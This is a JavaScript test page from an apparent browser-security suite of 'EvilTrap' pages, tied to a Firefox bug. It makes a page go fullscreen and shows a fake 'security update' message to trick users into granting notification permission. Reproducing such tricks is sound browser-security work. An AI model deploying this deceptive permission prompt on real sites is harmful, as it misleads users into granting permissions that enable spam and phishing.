import EvilTrap from '../../EvilTrap';

export default new EvilTrap('Fullscreen Permission Prompt', EvilTrap.CATEGORY.FULLSCREEN, null, { firefox: '1522120' })
  .addScriptPage(() => {
    const msg = document.createElement('h1');
    msg.style['background-color'] = 'white';
    const button = document.createElement('button');
    button.innerText = 'Click Me';

    button.addEventListener('click', async () => {
      button.style.visibility = 'hidden';
      await document.body.requestFullscreen();
      msg.innerText = 'Important security update! Click allow to continue.';

      // Notification permission as an example for a permission prompt
      const result = await Notification.requestPermission();
      document.exitFullscreen();

      if (result === 'granted') {
        // eslint-disable-next-line no-unused-vars
        const notification = new Notification('Update completed. Thank you for your cooperation.');
        msg.innerText = 'Update success!';
      } else {
        msg.innerText = 'Update failed!';
      }

      button.style.visibility = 'visible';
    });

    document.body.appendChild(msg);
    document.body.appendChild(button);
  });
